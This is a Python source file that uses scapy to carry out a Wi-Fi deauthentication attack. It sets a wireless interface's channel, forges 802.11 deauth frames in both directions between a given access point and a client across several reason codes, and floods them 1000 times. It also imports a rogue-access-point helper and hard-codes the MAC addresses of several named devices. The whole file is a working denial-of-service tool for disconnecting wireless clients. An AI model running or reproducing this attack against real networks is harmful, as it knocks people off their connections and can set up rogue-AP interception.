from scapy.all import *
import subprocess
from utils import attack_inet_set, config_rouge_ap
import sys

one_nord = "2E:E4:F0:11:48:B5"
Error404 = "10:5A:F7:0F:5F:14"
trala = "88:D7:F6:2A:5D:4D"
galaxy_s9 = "24:18:1D:7C:7A:EB"
וubuntu = "98:3B:8F:7C:7A:EB"


def deauth(ap_mac, client_mac, attck_inet, channel):
    subprocess.run(f'iwconfig {attck_inet} channel {channel}', check=True, shell=True)
    subprocess.run(f'ifconfig {attck_inet} up', check=True, shell=True)
    packets = []
    for reason_code in range(6, 20):
        deauth_packet1 = RadioTap() / Dot11(type=0,subtype=12, addr1=ap_mac, addr2=client_mac, addr3=client_mac) / Dot11Deauth(reason=reason_code)
        deauth_packet2 = RadioTap() / Dot11(type=0,subtype=12, addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=reason_code)
        packets.append(deauth_packet1)
        packets.append(deauth_packet2)
    for i in range(1000):
        for packet in packets:
            sendp(packet, count=1, inter=0.001, iface=attck_inet, verbose=0)


if __name__ == "__main__":
    #'26:18:1D:7C:7A:EB','2E:E4:F0:11:48:B5', "wlan1mon", "1"]
    deauth(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
